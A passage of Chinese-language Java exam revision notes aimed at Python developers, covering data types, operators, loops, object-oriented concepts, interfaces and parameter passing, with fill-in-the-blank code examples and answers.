数据类型</strong>（填空题）</h4><table><thead><tr><th>类型</th><th>位数</th><th>范围</th><th>Java示例</th><th>Python对比</th></tr></thead><tbody><tr><td><code>byte</code></td><td>8</td><td>-128~127</td><td><code>byte b = 10;</code></td><td><code>int</code>自动处理</td></tr><tr><td><code>int</code></td><td>32</td><td>≈±21亿</td><td><code>int i = 100;</code></td><td><code>int</code>无位数限制</td></tr><tr><td><code>double</code></td><td>64</td><td>IEEE 754浮点</td><td><code>double d=3.14;</code></td><td><code>float</code></td></tr><tr><td><code>char</code></td><td>16</td><td>Unicode字符</td><td><code>char c=&#39;A&#39;;</code></td><td><code>str</code>单字符</td></tr><tr><td><code>boolean</code></td><td>-</td><td><code>true</code>&#x2F;<code>false</code></td><td><code>boolean flag=true;</code></td><td><code>bool</code></td></tr></tbody></table><p><strong>引用类型</strong>：类&#x2F;数组&#x2F;接口（类似Python的类实例、list）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;hello&quot;</span>;  <span class="hljs-comment">// 引用类型声明</span><br><span class="hljs-type">int</span>[] arr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">5</span>]; <span class="hljs-comment">// 数组声明（固定长度）</span><br></code></pre></td></tr></table></figure><h4 id="3-运算符（程序填空）"><a href="#3-运算符（程序填空）" class="headerlink" title="3. 运算符（程序填空）"></a><strong>3. 运算符</strong>（程序填空）</h4><table><thead><tr><th>类型</th><th>运算符</th><th>特殊点</th></tr></thead><tbody><tr><td>算术</td><td><code>+ - * / %</code></td><td><code>10/3=3</code>（整数除）</td></tr><tr><td>关系</td><td><code>== != &gt; &lt;</code></td><td><strong><code>==</code>比较引用地址</strong>（字符串用<code>.equals()</code>）</td></tr><tr><td>逻辑</td><td>&#96;&amp;&amp;</td><td></td></tr><tr><td>赋值</td><td><code>= += -=</code></td><td><code>x += 5</code> 等价 <code>x = x+5</code></td></tr></tbody></table><h1 id="-1"><a href="#-1" class="headerlink" title=""></a></h1><h1 id="Java运算符考试详解（针对Python开发者）"><a href="#Java运算符考试详解（针对Python开发者）" class="headerlink" title="Java运算符考试详解（针对Python开发者）"></a><em>Java运算符考试详解（针对Python开发者）</em></h1><p><em>下面我将详细讲解Java运算符在考试中的具体考法，结合真题和Python对比，帮助您彻底掌握这些考点：</em></p><h2 id="一、算术运算符：整数除法的”陷阱题”"><a href="#一、算术运算符：整数除法的”陷阱题”" class="headerlink" title="一、算术运算符：整数除法的”陷阱题”"></a><em>一、算术运算符：整数除法的”陷阱题”</em></h2><h3 id="考试常见题型"><a href="#考试常见题型" class="headerlink" title="考试常见题型"></a><em>考试常见题型</em></h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 题型1：程序填空</span><br><span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;<br><span class="hljs-type">int</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-number">3</span>;<br><span class="hljs-type">double</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> a / b; <span class="hljs-comment">// 空1：c = ______ (3.0)</span><br><span class="hljs-type">double</span> <span class="hljs-variable">d</span> <span class="hljs-operator">=</span> (<span class="hljs-type">double</span>)a / b; <span class="hljs-comment">// 空2：d = ______ (3.333...)</span><br><br><span class="hljs-comment">// 题型2：判断题</span><br><span class="hljs-comment">// &quot;Java中5/2的结果是2.5&quot; → False（正确答案是2）</span><br></code></pre></td></tr></table></figure><h3 id="核心考点解析"><a href="#核心考点解析" class="headerlink" title="核心考点解析"></a><em>核心考点解析</em></h3><ol><li><p><em><strong>整数除法截断</strong>：</em></p><ul><li><em>Java：<code>10/3 = 3</code>（直接舍弃小数部分）</em></li><li><em>Python：<code>10/3 = 3.333...</code>（自动转为浮点除）</em></li></ul></li><li><p><em><strong>类型提升规则</strong>：</em></p><pre><code class=" mermaid">graph LRA[int/int] --&gt; B[int]C[double/int] --&gt; D[double]D --&gt; E[保留小数]</code></pre></li></ol><h3 id="避坑技巧"><a href="#避坑技巧" class="headerlink" title="避坑技巧"></a><em>避坑技巧</em></h3><ul><li><em>看到除法先看操作数类型</em></li><li><em>需要小数结果时，将被除数强转为<code>double</code></em></li><li><em>取模运算<code>%</code>的行为与Python相同</em></li></ul><h2 id="二、关系运算符：字符串比较的”死亡陷阱”"><a href="#二、关系运算符：字符串比较的”死亡陷阱”" class="headerlink" title="二、关系运算符：字符串比较的”死亡陷阱”"></a><em>二、关系运算符：字符串比较的”死亡陷阱”</em></h2><h3 id="考试高频题"><a href="#考试高频题" class="headerlink" title="考试高频题"></a><em>考试高频题</em></h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 题型1：程序输出判断</span><br><span class="hljs-type">String</span> <span class="hljs-variable">s1</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;hello&quot;</span>;<br><span class="hljs-type">String</span> <span class="hljs-variable">s2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-string">&quot;hello&quot;</span>);<br><br>System.out.println(s1 == s2); <span class="hljs-comment">// 空1：输出______ (false)</span><br>System.out.println(s1.equals(s2)); <span class="hljs-comment">// 空2：输出______ (true)</span><br><br><span class="hljs-comment">// 题型2：找错题</span><br><span class="hljs-comment">// 找出下面代码的错误：</span><br><span class="hljs-keyword">if</span> (nameInput == <span class="hljs-string">&quot;admin&quot;</span>) &#123; <span class="hljs-comment">// 应该用equals</span><br>    grantAccess();<br>&#125;<br></code></pre></td></tr></table></figure><table><thead><tr><th><em>比较方式</em></th><th><em>Java</em></th><th><em>Python</em></th></tr></thead><tbody><tr><td><em>值比较</em></td><td><em><code>.equals()</code></em></td><td><em><code>==</code></em></td></tr><tr><td><em>引用比较</em></td><td><em><code>==</code></em></td><td><em><code>is</code></em></td></tr></tbody></table><blockquote><p><em>💡 考试口诀：<strong>Java字符串，equals保平安</strong></em></p></blockquote><h2 id="三、逻辑运算符：短路规则的”隐蔽考点”"><a href="#三、逻辑运算符：短路规则的”隐蔽考点”" class="headerlink" title="三、逻辑运算符：短路规则的”隐蔽考点”"></a><em>三、逻辑运算符：短路规则的”隐蔽考点”</em></h2><h3 id="典型考题"><a href="#典型考题" class="headerlink" title="典型考题"></a><em>典型考题</em></h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 题型1：程序填空</span><br><span class="hljs-type">int</span> <span class="hljs-variable">x</span> <span class="hljs-operator">=</span> <span class="hljs-number">5</span>;<br><span class="hljs-type">boolean</span> <span class="hljs-variable">b1</span> <span class="hljs-operator">=</span> (x &gt; <span class="hljs-number">10</span>) &amp;&amp; (++x &gt; <span class="hljs-number">0</span>);<br><span class="hljs-comment">// 空1：x的值是？______ (5)</span><br><br><span class="hljs-type">boolean</span> <span class="hljs-variable">b2</span> <span class="hljs-operator">=</span> (x &lt; <span class="hljs-number">10</span>) || (++x &gt; <span class="hljs-number">0</span>);<br><span class="hljs-comment">// 空2：x的值是？______ (5)</span><br><br><span class="hljs-comment">// 题型2：输出结果分析</span><br><span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-number">5</span>;<br><span class="hljs-keyword">if</span> (a &gt; <span class="hljs-number">4</span> || a++ &lt; <span class="hljs-number">10</span>) &#123;<br>    System.out.println(a); <span class="hljs-comment">// 输出？______ (5)</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="短路规则详解"><a href="#短路规则详解" class="headerlink" title="短路规则详解"></a><em>短路规则详解</em></h3><table><thead><tr><th><em>表达式</em></th><th><em>执行情况</em></th><th><em>解释</em></th></tr></thead><tbody><tr><td><em><code>false &amp;&amp; ...</code></em></td><td><em>跳过右边</em></td><td><em>一假即假</em></td></tr><tr><td>*&#96;true</td><td></td><td>…&#96;*</td></tr><tr><td><em><code>true &amp;&amp; ...</code></em></td><td><em>执行右边</em></td><td><em>需验证</em></td></tr><tr><td>*&#96;false</td><td></td><td>…&#96;*</td></tr></tbody></table><h2 id="四、赋值运算符：类型转换的”暗坑”"><a href="#四、赋值运算符：类型转换的”暗坑”" class="headerlink" title="四、赋值运算符：类型转换的”暗坑”"></a><em>四、赋值运算符：类型转换的”暗坑”</em></h2><h3 id="经典考题"><a href="#经典考题" class="headerlink" title="经典考题"></a><em>经典考题</em></h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 题型1：编译错误判断</span><br><span class="hljs-type">byte</span> <span class="hljs-variable">num</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;<br>num = num + <span class="hljs-number">5</span>;   <span class="hljs-comment">// 空1：是否编译错误？______ (是)</span><br>num += <span class="hljs-number">5</span>;        <span class="hljs-comment">// 空2：是否编译错误？______ (否)</span><br><br><span class="hljs-comment">// 题型2：结果计算</span><br><span class="hljs-type">int</span> <span class="hljs-variable">x</span> <span class="hljs-operator">=</span> <span class="hljs-number">5</span>;<br>x += <span class="hljs-number">3</span> * <span class="hljs-number">2</span>;      <span class="hljs-comment">// 空3：x = ______ (11)</span><br></code></pre></td></tr></table></figure><h3 id="类型转换规则"><a href="#类型转换规则" class="headerlink" title="类型转换规则"></a><em>类型转换规则</em></h3><pre><code class=" mermaid">graph LR    A[byte + int] --&gt; B[int]    C[直接赋值给byte] --&gt; D[需要强制转换]    E[复合赋值] --&gt; F[自动转换]</code></pre><h3 id="复合赋值等价公式"><a href="#复合赋值等价公式" class="headerlink" title="复合赋值等价公式"></a><em>复合赋值等价公式</em></h3><table><thead><tr><th><em>表达式</em></th><th><em>等价形式</em></th><th><em>特殊处理</em></th></tr></thead><tbody><tr><td><em><code>x += y</code></em></td><td><em><code>x = (T)(x + y)</code></em></td><td><em>自动类型转换</em></td></tr><tr><td><em><code>x = x + y</code></em></td><td><em>-</em></td><td><em>需要手动转换</em></td></tr></tbody></table><h2 id="五、综合考题分析"><a href="#五、综合考题分析" class="headerlink" title="五、综合考题分析"></a><em>五、综合考题分析</em></h2><h3 id="真题示例（程序填空）"><a href="#真题示例（程序填空）" class="headerlink" title="真题示例（程序填空）"></a><em>真题示例（程序填空）</em></h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OperatorTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">// 算术运算符</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> <span class="hljs-number">7</span>, n = <span class="hljs-number">4</span>;<br>        <span class="hljs-type">double</span> <span class="hljs-variable">r1</span> <span class="hljs-operator">=</span> m / n;          <span class="hljs-comment">// 空1：______ (1.0)</span><br>        <span class="hljs-type">double</span> <span class="hljs-variable">r2</span> <span class="hljs-operator">=</span> (<span class="hljs-type">double</span>)m / n;  <span class="hljs-comment">// 空2：______ (1.75)</span><br>        <br>        <span class="hljs-comment">// 关系运算符</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">s1</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;java&quot;</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">s2</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Java&quot;</span>;<br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">b1</span> <span class="hljs-operator">=</span> s1.equals(s2); <span class="hljs-comment">// 空3：______ (false)</span><br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">b2</span> <span class="hljs-operator">=</span> s1.equalsIgnoreCase(s2); <span class="hljs-comment">// 空4：______ (true)</span><br>        <br>        <span class="hljs-comment">// 逻辑运算符</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">x</span> <span class="hljs-operator">=</span> <span class="hljs-number">5</span>;<br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">b3</span> <span class="hljs-operator">=</span> (x &gt; <span class="hljs-number">3</span>) &amp;&amp; (x++ &lt; <span class="hljs-number">10</span>); <span class="hljs-comment">// 空5：b3 = ______ (true)</span><br>        <span class="hljs-comment">// 空6：x = ______ (6)</span><br>        <br>        <span class="hljs-comment">// 赋值运算符</span><br>        <span class="hljs-type">byte</span> <span class="hljs-variable">y</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;<br>        y += <span class="hljs-number">20</span>; <span class="hljs-comment">// 空7：y = ______ (30)</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="解题技巧"><a href="#解题技巧" class="headerlink" title="解题技巧"></a><em>解题技巧</em></h3><ol><li><em><strong>整数除法</strong>：先看操作数类型，整数除结果必为整数</em></li><li><em><strong>字符串比较</strong>：永远用equals，&#x3D;&#x3D;只用于基本类型</em></li><li><em><strong>短路规则</strong>：注意自增(++)在逻辑表达式中的执行情况</em></li><li><em><strong>复合赋值</strong>：注意自动类型转换特性</em></li></ol><h2 id="六、Python开发者特别注意事项"><a href="#六、Python开发者特别注意事项" class="headerlink" title="六、Python开发者特别注意事项"></a><em>六、Python开发者特别注意事项</em></h2><table><thead><tr><th><em>运算符</em></th><th><em>Java陷阱</em></th><th><em>Python行为</em></th><th><em>应对策略</em></th></tr></thead><tbody><tr><td><em><code>/</code></em></td><td><em>整数除截断</em></td><td><em>自动浮点除</em></td><td><em>强转为double</em></td></tr><tr><td><em><code>==</code></em></td><td><em>比较对象引用</em></td><td><em>比较值</em></td><td><em>字符串用equals</em></td></tr><tr><td><em><code>&amp;&amp;</code></em></td><td><em>短路规则</em></td><td><em>and同样短路</em></td><td><em>避免右边有副作用</em></td></tr><tr><td><em><code>+=</code></em></td><td><em>自动类型转换</em></td><td><em>无类型限制</em></td><td><em>注意byte&#x2F;short类型</em></td></tr><tr><td><em><code>++</code></em></td><td><em>前后缀区别大</em></td><td><em>无此运算符</em></td><td><em>避免在复杂表达式使用</em></td></tr></tbody></table><h2 id="七、考试答题口诀"><a href="#七、考试答题口诀" class="headerlink" title="七、考试答题口诀"></a><em>七、考试答题口诀</em></h2><blockquote><p><em>除法先看类型，整数结果截断<br></em><br><em>字符串比用equals，&#x3D;&#x3D;只判血缘<br></em><br><em>逻辑运算会短路，右边可能不算<br></em><br><em>复合赋值能强转，普通赋值瞪眼<br></em><br><em>自增前后要分清，考试专设此险</em></p></blockquote><p><em>掌握这些考点和技巧，运算符相关题目将不再是难题！考试时遇到运算符题目，先默念口诀再作答，能有效避免常见陷阱。</em></p><h4 id="4-控制语句（与Python对比）"><a href="#4-控制语句（与Python对比）" class="headerlink" title="4. 控制语句（与Python对比）"></a><strong>4. 控制语句</strong>（与Python对比）</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// if-else（必须用括号）</span><br><span class="hljs-keyword">if</span> (score &gt;= <span class="hljs-number">60</span>) &#123;<br>    System.out.println(<span class="hljs-string">&quot;及格&quot;</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    System.out.println(<span class="hljs-string">&quot;不及格&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">// switch（支持int/char/String）</span><br><span class="hljs-keyword">switch</span>(grade) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;A&#x27;</span>: <br>        System.out.println(<span class="hljs-string">&quot;优秀&quot;</span>);<br>        <span class="hljs-keyword">break</span>;  <span class="hljs-comment">// 必须break，否则穿透！</span><br>    <span class="hljs-keyword">default</span>:<br>        System.out.println(<span class="hljs-string">&quot;未知&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="5-循环（重点！程序填空高频）"><a href="#5-循环（重点！程序填空高频）" class="headerlink" title="5. 循环（重点！程序填空高频）"></a><strong>5. 循环</strong>（重点！程序填空高频）</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// for循环（固定次数）</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">10</span>; i++) &#123;  <span class="hljs-comment">// i只在循环内有效</span><br>    System.out.print(i);<br>&#125;<br><br><span class="hljs-comment">// while（条件循环）</span><br><span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">while</span> (j&lt;<span class="hljs-number">5</span>) &#123;<br>    System.out.print(j);<br>    j++;<br>&#125;<br><br><span class="hljs-comment">// do-while（至少执行一次）</span><br><span class="hljs-type">int</span> k=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">do</span> &#123;<br>    System.out.print(k);<br>    k++;<br>&#125; <span class="hljs-keyword">while</span> (k&lt;<span class="hljs-number">3</span>);<br></code></pre></td></tr></table></figure><h4 id="6-break-continue（判断题）"><a href="#6-break-continue（判断题）" class="headerlink" title="6. break&#x2F;continue（判断题）"></a><strong>6. break&#x2F;continue</strong>（判断题）</h4><ul><li><code>break</code>：跳出<strong>整个循环</strong>（同Python）</li><li><code>continue</code>：跳过<strong>本次循环</strong>剩余代码（同Python）</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">10</span>; i++) &#123;<br>    <span class="hljs-keyword">if</span> (i == <span class="hljs-number">5</span>) <span class="hljs-keyword">break</span>;     <span class="hljs-comment">// 结束循环（i=5时退出）</span><br>    <span class="hljs-keyword">if</span> (i % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>) <span class="hljs-keyword">continue</span>; <span class="hljs-comment">// 跳过偶数</span><br>    System.out.print(i);  <span class="hljs-comment">// 输出：1 3</span><br>&#125;<br></code></pre></td></tr></table></figure><hr><h3 id="第三章-面向对象（核心！）"><a href="#第三章-面向对象（核心！）" class="headerlink" title="第三章 面向对象（核心！）"></a><strong>第三章 面向对象（核心！）</strong></h3><p><img src="/%5Cimages%5Cjava.png"></p><h4 id="1-基本概念（简答题）"><a href="#1-基本概念（简答题）" class="headerlink" title="1. 基本概念（简答题）"></a><strong>1. 基本概念</strong>（简答题）</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Dog</span> &#123;                 <span class="hljs-comment">// 类定义（类似Python class）</span><br>    String name;            <span class="hljs-comment">// 成员变量（属性）</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Dog</span><span class="hljs-params">(String n)</span> &#123;  <span class="hljs-comment">// 构造方法（__init__）</span><br>        <span class="hljs-built_in">this</span>.name = n;      <span class="hljs-comment">// this指当前对象</span><br>    &#125;<br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">bark</span><span class="hljs-params">()</span> &#123;           <span class="hljs-comment">// 成员方法</span><br>        System.out.println(name + <span class="hljs-string">&quot;汪汪！&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-comment">// 创建对象</span><br><span class="hljs-type">Dog</span> <span class="hljs-variable">myDog</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Dog</span>(<span class="hljs-string">&quot;Buddy&quot;</span>);  <span class="hljs-comment">// new实例化（Python直接Dog()）</span><br>myDog.bark();  <span class="hljs-comment">// 调用方法</span><br></code></pre></td></tr></table></figure><h4 id="2-三大特性"><a href="#2-三大特性" class="headerlink" title="2. 三大特性"></a><strong>2. 三大特性</strong></h4><table><thead><tr><th>特性</th><th>Java实现</th><th>Python对比</th></tr></thead><tbody><tr><td><strong>封装</strong></td><td><code>private</code>&#x2F;<code>protected</code>&#x2F;<code>public</code></td><td>命名约定（_name）</td></tr><tr><td><strong>继承</strong></td><td><code>extends</code>（单继承）</td><td>多继承（MRO）</td></tr><tr><td><strong>多态</strong></td><td>父类引用指向子类对象 + 方法重写</td><td>Duck Typing</td></tr></tbody></table><p><strong>继承示例</strong>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Animal</span> &#123; <span class="hljs-keyword">void</span> <span class="hljs-title function_">eat</span><span class="hljs-params">()</span> &#123; System.out.println(<span class="hljs-string">&quot;Eating...&quot;</span>); &#125; &#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Cat</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Animal</span> &#123;  <span class="hljs-comment">// 继承</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">eat</span><span class="hljs-params">()</span> &#123;  <span class="hljs-comment">// 方法重写（多态基础）</span><br>        System.out.println(<span class="hljs-string">&quot;Cat eats fish&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-comment">// 多态应用</span><br><span class="hljs-type">Animal</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>();  <span class="hljs-comment">// 父类引用指向子类对象</span><br>a.eat();  <span class="hljs-comment">// 输出&quot;Cat eats fish&quot;（动态绑定）</span><br></code></pre></td></tr></table></figure><h4 id="3-访问控制（单选题）"><a href="#3-访问控制（单选题）" class="headerlink" title="3. 访问控制（单选题）"></a><strong>3. 访问控制</strong>（单选题）</h4><table><thead><tr><th>修饰符</th><th>类内</th><th>同包</th><th>子类</th><th>其他包</th></tr></thead><tbody><tr><td><code>private</code></td><td>✅</td><td>❌</td><td>❌</td><td>❌</td></tr><tr><td><code>protected</code></td><td>✅</td><td>✅</td><td>✅</td><td>❌</td></tr><tr><td><code>public</code></td><td>✅</td><td>✅</td><td>✅</td><td>✅</td></tr></tbody></table><hr><h3 id="第四章-高级特性（重点！）"><a href="#第四章-高级特性（重点！）" class="headerlink" title="第四章 高级特性（重点！）"></a><strong>第四章 高级特性（重点！）</strong></h3><p>只有static和final可组合在一起，而abstract和static一般不能组<br>合在一起。</p><p>• 接口与类的共同点：均可以实现类的继承。<br>• 接口与类的不同点：<br>（1）一个接口可由一个类或多个类来实现，一个类也可以实现<br>多个接口，从而具备多重继承的特性。但是一个类只能有一个直<br>接父类，没有多重继承的特性。<br>（2）接口中的所有方法均没有方法体，只有成员方法名，而类<br>要实现接口的话，必须实现接口里面的所有成员方法。<br>（3）一个类可以直接继承其父类的成员方法，不需要去实现方<br>法，也可以重载或者重写其父类的成员方法。</p><h4 id="1-关键字"><a href="#1-关键字" class="headerlink" title="1. 关键字"></a><strong>1. 关键字</strong></h4><table><thead><tr><th>关键字</th><th>作用</th><th>示例</th></tr></thead><tbody><tr><td><code>abstract</code></td><td>抽象类&#x2F;方法（不能实例化）</td><td><code>abstract void draw();</code></td></tr><tr><td><code>static</code></td><td>类级别共享</td><td><code>static int count=0;</code></td></tr><tr><td><code>final</code></td><td>常量&#x2F;不可继承</td><td><code>final double PI=3.14;</code></td></tr><tr><td><code>this</code></td><td>当前对象引用</td><td><code>this.name = name;</code></td></tr></tbody></table><h4 id="2-接口-vs-抽象类（简答题）"><a href="#2-接口-vs-抽象类（简答题）" class="headerlink" title="2. 接口 vs 抽象类（简答题）"></a><strong>2. 接口 vs 抽象类</strong>（简答题）</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Flyable</span> &#123;          <span class="hljs-comment">// 接口（100%抽象）</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">fly</span><span class="hljs-params">()</span>;              <span class="hljs-comment">// 默认public abstract</span><br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Bird</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Flyable</span> &#123;  <span class="hljs-comment">// 实现接口（多继承）</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">fly</span><span class="hljs-params">()</span> &#123; <br>        System.out.println(<span class="hljs-string">&quot;拍翅膀飞&quot;</span>); <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="3-参数传递（程序填空）"><a href="#3-参数传递（程序填空）" class="headerlink" title="3. 参数传递（程序填空）"></a><strong>3. 参数传递</strong>（程序填空）</h4><ul><li><strong>基本类型</strong>：值传递（方法内修改不影响外部）</li><li><strong>引用类型</strong>：地址传递（方法内修改对象属性会影响外部）</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">void</span> <span class="hljs-title function_">change</span><span class="hljs-params">(<span class="hljs-type">int</span> num, <span class="hljs-type">int</span>[] arr)</span> &#123;<br>    num = <span class="hljs-number">100</span>;         <span class="hljs-comment">// 不影响外部</span><br>    arr[<span class="hljs-number">0</span>] = <span class="hljs-number">99</span>;       <span class="hljs-comment">// 修改外部数组</span><br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-variable">x</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;<br><span class="hljs-type">int</span>[] a = &#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>&#125;;<br>change(x, a);<br>System.out.println(x); <span class="hljs-comment">// 输出10（未变）</span><br>System.out.println(a[<span class="hljs-number">0</span>]); <span class="hljs-comment">// 输出99（已修改）</span><br></code></pre></td></tr></table></figure><hr><h3 id="第五章-数组、字符串、集合（重点！）"><a href="#第五章-数组、字符串、集合（重点！）" class="headerlink" title="第五章 数组、字符串、集合（重点！）"></a><strong>第五章 数组、字符串、集合（重点！）</strong></h3><h4 id="1-数组（程序填空）"><a href="#1-数组（程序填空）" class="headerlink" title="1. 数组（程序填空）"></a><strong>1. 数组</strong>（程序填空）</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span>[] arr1 = &#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>&#125;;           <span 